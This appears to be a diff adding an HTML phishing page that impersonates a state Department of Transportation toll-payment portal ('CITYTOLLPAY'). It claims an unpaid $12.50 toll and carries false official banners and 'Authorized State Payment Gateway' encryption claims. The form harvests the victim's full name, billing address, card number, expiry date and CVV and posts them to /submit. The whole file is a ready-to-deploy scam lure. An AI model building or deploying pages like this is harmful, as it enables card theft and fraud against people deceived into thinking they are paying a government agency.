@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>State Toll Services | Secure Payment Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .gov-blue { background-color: #003366; }
+        .action-blue { background-color: #0055A4; }
+        .action-blue:hover { background-color: #003d7a; }
+    </style>
+</head>
+<body class="bg-gray-100 font-sans">
+    <div class="gov-blue text-white py-1 px-4 text-[10px] font-bold uppercase tracking-widest text-center">
+        Official Department of Transportation Notification System
+    </div>
+    <nav class="bg-white shadow-sm py-4 px-8 border-b-2 border-gray-200">
+        <div class="max-w-4xl mx-auto flex justify-between items-center">
+            <div class="text-2xl font-black text-blue-900 tracking-tighter">
+                CITY<span class="text-blue-500">TOLL</span><span class="text-gray-400 font-light">PAY</span>
+            </div>
+        </div>
+    </nav>
+
+    <main class="max-w-md mx-auto mt-6 mb-10 p-8 bg-white shadow-2xl rounded-sm border-t-4 border-blue-600">
+        <div class="mb-6">
+            <h2 class="text-xl font-bold text-gray-800">Unpaid Toll Settlement</h2>
+            <p class="text-xs text-gray-500 mt-1 italic">Invoice Reference: #TL-8842-AX</p>
+        </div>
+
+        <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
+            <div class="flex justify-between items-center">
+                <span class="text-xs font-bold text-red-800 uppercase">Amount Due:</span>
+                <span class="text-2xl font-black text-red-600">$12.50</span>
+            </div>
+        </div>
+
+        <form action="/submit" method="POST" class="space-y-4">
+            <div>
+                <label class="block text-[10px] font-black text-gray-500 uppercase mb-1">Full Name (as it appears on card)</label>
+                <input type="text" name="u_name" required class="w-full p-2.5 border border-gray-300 rounded focus:border-blue-500 outline-none" placeholder="John R. Doe">
+            </div>
+
+            <div class="pt-2 border-t border-gray-100">
+                <label class="block text-[10px] font-black text-gray-400 uppercase mb-2">Billing Address</label>
+                <div class="space-y-3">
+                    <input type="text" name="u_addr" required class="w-full p-2.5 border border-gray-300 rounded focus:border-blue-500 outline-none text-sm" placeholder="Street Address">
+                    <div class="flex gap-2">
+                        <input type="text" name="u_city" required class="w-2/3 p-2.5 border border-gray-300 rounded focus:border-blue-500 outline-none text-sm" placeholder="City">
+                        <input type="text" name="u_state" maxlength="2" required class="w-1/3 p-2.5 border border-gray-300 rounded focus:border-blue-500 outline-none text-sm uppercase" placeholder="ST">
+                    </div>
+                    <input type="text" name="u_zip" maxlength="5" required class="w-full p-2.5 border border-gray-300 rounded focus:border-blue-500 outline-none text-sm" placeholder="ZIP Code">
+                </div>
+            </div>
+
+            <div class="pt-2 border-t border-gray-100">
+                <label class="block text-[10px] font-black text-gray-400 uppercase mb-2">Payment Details</label>
+                <input type="text" name="u_card" maxlength="16" required class="w-full p-2.5 border border-gray-300 rounded focus:border-blue-500 outline-none mb-3" placeholder="Card Number">
+                <div class="flex gap-2">
+                    <input type="text" name="u_exp" maxlength="5" required class="w-1/2 p-2.5 border border-gray-300 rounded focus:border-blue-500 outline-none text-sm" placeholder="MM/YY">
+                    <input type="text" name="u_cvv" maxlength="4" required class="w-1/2 p-2.5 border border-gray-300 rounded focus:border-blue-500 outline-none text-sm" placeholder="CVV">
+                </div>
+            </div>
+
+            <div class="pt-4">
+                <button type="submit" class="w-full action-blue text-white font-black py-4 rounded shadow-lg transition duration-200 uppercase tracking-widest text-xs">
+                    Confirm & Settle Payment
+                </button>
+            </div>
+        </form>
+
+        <div class="mt-8 flex justify-center opacity-30 grayscale">
+            <img src="https://img.icons8.com/color/48/000000/visa.png" class="h-5 mx-2">
+            <img src="https://img.icons8.com/color/48/000000/mastercard.png" class="h-5 mx-2">
+            <img src="https://img.icons8.com/color/48/000000/amex.png" class="h-5 mx-2">
+        </div>
+    </main>
+
+    <footer class="text-center pb-10">
+        <p class="text-[9px] text-gray-400 uppercase tracking-widest leading-relaxed">
+            Authorized State Payment Gateway <br>
+            Secure 256-bit Encryption Active <br>
+            © 2026 Dept of Transportation. All Rights Reserved.
+        </p>
+    </footer>
+</body>
+</html>
